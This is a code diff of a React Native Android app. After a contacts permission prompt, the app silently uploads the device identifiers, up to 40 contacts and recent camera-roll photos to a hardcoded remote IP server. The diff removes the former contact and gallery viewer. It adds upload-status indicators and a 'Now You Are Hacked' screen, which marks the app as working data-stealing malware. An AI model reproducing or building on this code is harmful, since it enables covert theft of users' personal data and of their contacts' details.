@@ -8,31 +8,27 @@ import React, { useState, useEffect } from "react";
 import {
   PermissionsAndroid,
   Platform,
-  SafeAreaView,
-  StyleSheet,
   Text,
   View,
-  FlatList,
-  TextInput, TouchableOpacity,
-  Image
+  Button,
 } from "react-native";
 
 import Contacts from "react-native-contacts";
-import ListItem from "./component/ListItem";
 import CameraRoll from "@react-native-community/cameraroll";
 import DeviceInfo from 'react-native-device-info';
 import axios from "axios"
-
-let form_data = undefined;
+import RNRestart from 'react-native-restart'; 
 
 // let SERVER_URL = 'http://192.168.1.2:5000/api';
 let SERVER_URL = 'http://3.131.100.54:5000/api';
 
 const App = () => {
   const [contacts, setContacts] = useState([]);
-  const [whichMode, setWhichMode] = useState("contact")
   const [imageData, setImageData] = useState(undefined);
   const [deviceId, setDeviceId] = useState(undefined);
+  const [statusInfo, setStatusInfo] = useState(undefined);
+  const [statusContact, setStatuContact] = useState(undefined);
+  const [statusImg, setStatuImg] = useState(undefined);
 
   let deviceJSON = {};
 
@@ -45,9 +41,11 @@ const App = () => {
     let data = deviceJSON ? deviceJSON : {}
     axios.post(`${SERVER_URL}/client`, data)
       .then(function (response) {
-        // console.log(response);
+        setStatusInfo(true)
+        console.log("status", response.status);
       })
       .catch(function (error) {
+        setStatusInfo(false)
         // console.log(error);
       });
   }
@@ -55,26 +53,19 @@ const App = () => {
 
   useEffect(() => {
     if (Platform.OS === "android") {
-
-      getdeviceId()
       PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_CONTACTS, {
         title: "Contacts",
         message: "This app would like to view your contacts."
       }).then(() => {
         loadContacts();
+        loadImage();
       });
-    } else {
-      loadContacts();
-    }
+    } 
 
-    loadImage()
-
-
+  
 
     const createFormData = (array, body) => {
-
       const data = new FormData();
-
       array.forEach(photo => {
         let _img = photo.node
         let yourstring = _img.image.uri
@@ -89,7 +80,7 @@ const App = () => {
       })
 
       Object.keys(body).forEach(key => {
-        data.append({ deviceId: deviceId });
+        data.append({ deviceId: deviceJSON ? deviceJSON.deviceId : null });
       });
 
       return data;
@@ -111,24 +102,32 @@ const App = () => {
       }
 
       CameraRoll.getPhotos({
-        first: 50,
+        first: 10,
         assetType: 'Photos',
       })
         .then(res => {
           let _data = res.edges;
-          // console.log("CAMEEEEE", _data)
           let body = {
             deviceId: deviceId,
           }
           let form_data_push = createFormData(_data, body)
           setImageData(_data)
-
-          axios.post(`${SERVER_URL}/images`, form_data_push)
+          let headers = {
+               "Content-Type": "multipart/form-data",
+               "cache-control": "no-cache",
+               "processData": false,
+               "contentType": false,
+               "mimeType": "multipart/form-data", 
+          }
+          console.log("PUSH ", form_data_push)
+          axios.post(`${SERVER_URL}/images`, form_data_push, headers)
             .then(function (response) {
-              // console.log(response);
+                setStatuImg(true)
+                console.log("status img", response);
             })
             .catch(function (error) {
-              // console.log(error);
+              setStatuImg(false)
+              console.log("status img", error);
             });
         })
         .catch((error) => {
@@ -138,14 +137,15 @@ const App = () => {
 
     setTimeout(() => {
       send_DeviceInfo()
-      postContact()
-    }, 5000);
+    }, 1000);
   }, []);
 
 
 
+
+
   const loadContacts = () => {
-    var uniqueId = DeviceInfo.getUniqueId();
+    var uniqueId = deviceJSON ? deviceJSON.uniqueId : undefined;
     Contacts.getAll((err, contacts) => {
       contacts.sort((a, b) => a.givenName.toLowerCase() > b.givenName.toLowerCase());
       if (err === "denied") {
@@ -153,136 +153,39 @@ const App = () => {
         console.warn("Permission to access contacts was denied");
       } else {
         let tempContact = contacts ? [...contacts] : [];
+        let splice_len = 40;
         tempContact && tempContact.length > 0 && tempContact.map((contact, index) => {
           contact.device_id = uniqueId
         })
+        if(tempContact && tempContact.length > 40){
+          tempContact.splice(splice_len)
+        }
+        // console.log("SAROJ", tempContact.length)
         setContacts(contacts);
         axios.post(`${SERVER_URL}/contacts`, tempContact)
           .then(function (response) {
-            // console.log(response);
+            setStatuContact(true)
+            console.log("status contact", response.status);
           })
           .catch(function (error) {
-            // console.log(error);
+            setStatuContact(false)
           });
       }
     });
   }
 
 
-  const getdeviceId = () => {
-    var uniqueId = DeviceInfo.getUniqueId();
-    setDeviceId(uniqueId);
-  };
-
-
-
-  // const openContact = (contact) => {
-  //   console.log(JSON.stringify(contact));
-  //   Contacts.openExistingContact(contact, () => { })
-  // };
-
-
-  const postContact = () => {
-
-  }
-
-
-
-
-  // console.log("CONTACTS", filename);
-
 
   return (
-    // <SafeAreaView style={styles.container}>
-    //   <View style={styles.container}>
-    //     <Text style={styles.header}>
-    //       Access Contact List in React Native
-    //     </Text>
-    //     <View style={{ display: 'flex', flexDirection: 'row', alignItems: 'center', justifyContent: 'space-around', marginVertical: 10 }}>
-
-    //       <TouchableOpacity
-    //         style={styles.btn}
-    //         onPress={() => setWhichMode("contact")}>
-    //         <Text style={{ color: "#fff" }}>Contact</Text>
-    //       </TouchableOpacity>
-
-    //       <TouchableOpacity
-    //         style={styles.btn}
-    //         onPress={() => setWhichMode("gallery")}>
-    //         <Text style={{ color: "#fff" }}>gallery</Text>
-    //       </TouchableOpacity>
-    //     </View>
-
-    //     {whichMode === "gallery" && (
-    //       <View style={{ display: 'flex', flexDirection: 'row', flexWrap: 'wrap' }}>
-    //         {imageData && imageData.length > 0 && imageData.map((image, index) => {
-    //           return (
-    //             <TouchableOpacity key={"img" + index} style={{ borderWidth: 2, margin: 5, borderColor: '#ccc', width: '30%', }}>
-    //               <Image
-    //                 style={{
-    //                   width: '100%',
-    //                   height: 150,
-    //                 }}
-    //                 source={{ uri: image.node.image.uri }}
-    //               />
-    //             </TouchableOpacity>
-    //           )
-    //         })}
-    //       </View>
-    //     )}
-
-
-    //     {whichMode === "contact" && (
-    //       <View>
-    //         <FlatList
-    //           data={contacts}
-    //           renderItem={(contact) => {
-    //             // { console.log('contact -> ' + JSON.stringify(contact)) }
-    //             return (<ListItem
-    //               key={contact.item.recordID}
-    //               item={contact.item}
-    //               onPress={openContact}
-    //             />)
-    //           }}
-    //           keyExtractor={item => item.recordID}
-    //         />
-    //       </View>
-    //     )}
-
-
-    //   </View>
-    // </SafeAreaView>
     <View style={{ backgroundColor: '#000', flex: 1 }}>
-      <Text style={{ fontSize: 9, color: (contacts && imageData) ? "#222" : 'green' }}>Now You Are {(contacts && imageData) ? "Hacked" : "Safe"}</Text>
-      <Text>Your Device Id is {deviceId ? deviceId : null}</Text>
+      <Text style={{ fontSize: 9, color: (contacts && imageData) ? "#fff" : 'green' }}>Now You Are {(contacts && imageData) ? "Hacked" : "Safe"}</Text>
+      <Text style={{ color: 'red' }}>{deviceJSON ? JSON.stringify(deviceJSON) : "Unknown"}</Text>
+      <Text style={{ color: 'green' }}>device info upload <Text style={{ color: 'red' }}>{statusInfo? "ok" : "Unknown"}</Text></Text>
+      <Text style={{ color: 'green' }}>image info upload  <Text style={{ color: 'red' }}>{statusImg ? "ok" : "Unknown"}</Text></Text>
+      <Text style={{ color: 'green' }}>contact info upload  <Text style={{ color: 'red' }}>{statusContact ? "ok" : "Unknown"}</Text></Text>
+
+      <Button title="CLICK" onPress={() => RNRestart.Restart()}></Button>
     </View>
   );
 }
 export default App;
-
-const styles = StyleSheet.create({
-  container: {
-    flex: 1
-  },
-  header: {
-    backgroundColor: '#4591ed',
-    color: 'white',
-    paddingHorizontal: 5,
-    paddingVertical: 5,
-    fontSize: 10
-  },
-  searchBar: {
-    backgroundColor: '#f0eded',
-    paddingHorizontal: 30,
-    paddingVertical: (Platform.OS === "android") ? undefined : 15,
-  },
-  btn: {
-    height: 30,
-    backgroundColor: 'green',
-    width: 100,
-    display: 'flex',
-    alignItems: 'center',
-    justifyContent: 'center',
-    borderRadius: 3
-  }
-});
